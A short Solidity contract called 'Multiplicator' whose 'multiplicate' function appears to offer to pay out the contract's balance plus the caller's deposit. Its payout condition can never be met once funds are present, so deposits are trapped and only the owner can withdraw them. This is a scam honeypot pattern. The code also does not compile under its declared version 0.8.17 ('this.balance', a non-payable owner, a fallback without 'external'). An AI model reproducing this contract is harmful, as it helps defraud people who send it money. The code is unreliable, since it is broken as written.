pragma solidity ^0.8.17;

contract Multiplicator {
    address public owner = msg.sender;

    fallback() payable {}

    function withdraw() external payable {
        require(msg.sender == owner, "Permission Denied");
        owner.transfer(this.balance);
    }

    function multiplicate(address adr) external payable {
        if (msg.value >= this.balance) {
            adr.transfer(this.balance + msg.value);
        }
    }

}
